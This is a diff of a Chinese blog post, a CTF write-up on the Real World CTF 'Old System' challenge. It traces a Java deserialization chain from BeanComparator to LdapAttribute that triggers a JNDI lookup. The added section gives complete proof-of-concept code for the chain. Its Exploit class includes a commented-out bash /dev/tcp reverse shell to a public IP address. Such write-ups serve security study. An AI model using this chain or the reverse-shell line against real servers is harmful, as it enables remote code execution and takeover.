@@ -1,3 +1,18 @@
+---
+layout: post
+title: 基于rw2021 oldSystem题目的新jndi链子
+categories: [blog ]
+tags: [Java,]
+description: "重生之我是java🐕"
+image:
+  feature: windows.jpg
+  credit: JYcxk
+  creditlink: azeril.com
+ 
+
+
+---
+
 # Real World CTF 3rd Writeup | Old System
 
 ### 前言
@@ -14,11 +29,11 @@
 
 代码不多，有用了就二个java类，看着名字就不简单的样子
 
-![image-20231009194336472](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231009194336472.png)
+![image-20231009194336472](..\img\final\image-20231009194336472.png)
 
 lib里面也就只有四个第三方库
 
-![image-20231009194601453](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231009194601453.png)
+![image-20231009194601453](..\img\final\image-20231009194601453.png)
 
 通过web.xml可以发现这个是通过tomcat的java web项目构建的
 
@@ -136,7 +151,7 @@ commons-beanutils 依赖版本是 1.6
 commons-collections:2.1
 ```
 
-![image-20231009200752496](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231009200752496.png)
+![image-20231009200752496](..\img\final\image-20231009200752496.png)
 
 大体的可以看出就是根据，CC和CB的结合，在jdk1.4中拼接一条链子
 
@@ -144,19 +159,19 @@ commons-collections:2.1
 导入进来以后发现，CC常用的一些 transformer类都没了，只能看CB了
 ```
 
-![image-20231009203446824](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231009203446824.png)
+![image-20231009203446824](..\img\final\image-20231009203446824.png)
 
 想看PriorityQueue类有没有（网上下载了jdk1.4但是版本不兼容）所以不知道有没有这个PriorityQueue
 
-![image-20231009203841165](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231009203841165.png)
+![image-20231009203841165](..\img\final\image-20231009203841165.png)
 
 这里就看见了（看CB依赖看的，compare很重要的 毕竟比较就会调用——
 
-![image-20231009204909703](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231009204909703.png)
+![image-20231009204909703](..\img\final\image-20231009204909703.png)
 
 这里通过比对发下吗（jdk1.4里面是 compare）jdk1.7就是compareTo，并且没有PriorityQueue类
 
-![image-20231009211156248](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231009211156248.png)
+![image-20231009211156248](..\img\final\image-20231009211156248.png)
 
 所以我们需要找谁调用了TreeMap的get方法（这是目前唯一的思路）
 
@@ -279,11 +294,11 @@ static boolean eq(Object x, Object y) {
     }
 ```
 
-![image-20231009215632214](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231009215632214.png)
+![image-20231009215632214](..\img\final\image-20231009215632214.png)
 
-![image-20231009215716172](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231009215716172.png)
+![image-20231009215716172](..\img\final\image-20231009215716172.png)
 
-![image-20231009215753857](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231009215753857.png)
+![image-20231009215753857](..\img\final\image-20231009215753857.png)
 
 ### `总结以下目前的调用链子`
 
@@ -318,7 +333,7 @@ hashMap.put(treeMap2, "ccc");
 
 接下来就是如何rce了，从（ProperUtils在CB依赖中没影响）
 
-![image-20231009221032080](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231009221032080.png)
+![image-20231009221032080](..\img\final\image-20231009221032080.png)
 
 
 
@@ -335,7 +350,7 @@ hashMap.put(treeMap2, "ccc");
 1. 实现了Serializable接口
 2. 其某个getter方法里进行了敏感危险操作，而且是public修饰的getter方法（不能有参数 ）
 
-![image-20231010144712491](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231010144712491.png)
+![image-20231010144712491](..\img\final\image-20231010144712491.png)
 
 
 
@@ -376,11 +391,11 @@ final class LdapAttribute extends BasicAttribute {
 
 `但是这个context类型是（InitialDirContext类型的 ）`
 
-![image-20231010153247755](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231010153247755.png)
+![image-20231010153247755](..\img\final\image-20231010153247755.png)
 
 纠正一下上面的错误，
 
-![image-20231010194512605](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231010194512605.png)
+![image-20231010194512605](..\img\final\image-20231010194512605.png)
 
 首先我们进入getBaseCtx()类型看一下
 
@@ -389,13 +404,13 @@ final class LdapAttribute extends BasicAttribute {
 定义了一个hashtable然后put赋值，需要注意的是这里的baseCtxURL是我们的ldap，InitialDirContext是一个初始化的操作
 ```
 
-![image-20231010194723534](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231010194723534.png)
+![image-20231010194723534](..\img\final\image-20231010194723534.png)
 
 可是这个类的lookup会调用到HiermemDirCtx的lookup上，并且这个HiermemDirCtx和InitialContext没一点关系
 
-![image-20231010195858994](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231010195858994.png)
+![image-20231010195858994](..\img\final\image-20231010195858994.png)
 
-![image-20231010195908256](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231010195908256.png)
+![image-20231010195908256](..\img\final\image-20231010195908256.png)
 
 但是看一下jndi的lookup调用,说明调用哪一个lookup都可以
 
@@ -467,13 +482,13 @@ payload非常的简单只不过
 
 调试了半天也没找到缘由，只有 a/b才为2，别的普通字符串都是1作为了一个整体
 
-![image-20231010211217469](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231010211217469.png)
+![image-20231010211217469](..\img\final\image-20231010211217469.png)
 
-![image-20231010210425878](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231010210425878.png)
+![image-20231010210425878](..\img\final\image-20231010210425878.png)
 
 我们发现只有这个为size 2才有 tail的值，分为了head和tail，毕竟我们需要的函数在满足if条件里面
 
-![image-20231010211324947](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231010211324947.png)
+![image-20231010211324947](..\img\final\image-20231010211324947.png)
 
 ```
 var7 = this.c_resolveIntermediate_nns(var6, var2);
@@ -520,7 +535,7 @@ public class poc {
 }
 ```
 
-![image-20231010183740300](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231010183740300.png)
+![image-20231010183740300](..\img\final\image-20231010183740300.png)
 
 最后写一下利用链子：
 
@@ -558,7 +573,7 @@ java.io.ObjectInputStream#readObject
 
 （直接jdk8+CB 依赖）有空了就补上
 
-![image-20231010212146662](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231010212146662.png)
+![image-20231010212146662](..\img\final\image-20231010212146662.png)
 
 
 
@@ -619,3 +634,113 @@ new Object[] {"name"});
 [Real World CTF 3rd Writeup | Old System (qq.com)](https://mp.weixin.qq.com/s/hXoUs4ZJgLHHaTvoyhwFxg)
 
 https://y4er.com/posts/real-wolrd-ctf-old-system-new-getter-jndi-gadget/
+
+## CB链无依赖CC链(适用于jdk8版本)
+
+```java
+package CB;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.beanutils.BeanComparator;
+
+import javax.naming.CompositeName;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.PriorityQueue;
+public class cb1cb {
+    public static void setFieldValue(Object obj, String fieldName, Object
+            value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+    public static void main(String[] args) throws Exception {
+        String ldapCtxUrl = "ldap://127.0.0.1:9999/";
+
+        Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
+        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
+                new Class[] {String.class});
+        ldapAttributeClazzConstructor.setAccessible(true);
+        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
+                new Object[] {"name"});
+
+        Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField("baseCtxURL");
+        baseCtxUrlField.setAccessible(true);
+        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);
+
+        Field rdnField = ldapAttributeClazz.getDeclaredField("rdn");
+        rdnField.setAccessible(true);
+        rdnField.set(ldapAttribute, new CompositeName("a//b"));
+
+
+        final BeanComparator comparator = new BeanComparator("attributeDefinition",
+                String.CASE_INSENSITIVE_ORDER);
+        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,
+                comparator);
+// stub data for replacement later
+        setFieldValue(queue, "queue", new Object[]{ldapAttribute, ldapAttribute});
+        setFieldValue(queue,"size",2);
+
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(queue);
+        oos.close();
+
+        System.out.println(barr);
+        ObjectInputStream ois = new ObjectInputStream(new
+                ByteArrayInputStream(barr.toByteArray()));
+        Object o = (Object)ois.readObject();
+    }
+}
+```
+
+![image-20231012191922073](..\img\final\image-20231012191922073.png)
+
+放一下Exploit的代码
+
+```java
+public class Exploit {
+   public Exploit(){
+       try{
+           // 要执行的命令
+           //String[] commands = {"bash","-c","exec 5<>/dev/tcp/101.42.224.57/12345;cat <&5 | while read line; do $line 2>&5 >&5; done"};
+           String[] commands={"calc"};
+           Process pc = Runtime.getRuntime().exec(commands);
+           pc.waitFor();
+      } catch(Exception e){
+           e.printStackTrace();
+      }
+  }
+
+   public static void main(String[] argv) {
+       Exploit e = new Exploit();
+  }
+}
+
+```
+
+调用链子
+
+```java
+jdk.PriorityQueue#readObject
+     PriorityQueue#heapify
+           PriorityQueue#siftDown
+                priorityQueue#siftDownUsingComparator
+                    CB.  BeanComparator#compare
+                          cb      PropertyUtils#getproperty
+                                     PropertyUtils#getNestedProperty
+                                            PropertyUtils#getSimpleProperty
+                                              com.sun.jndi.ldap.LdapAttribute#getAttributeDefinition
+```
+
+#### 总结
+
+```java
+那如果是这样的话，fastjson、jackson触发getter方法应该也能打，以后碰上在搞！！！
+```
+
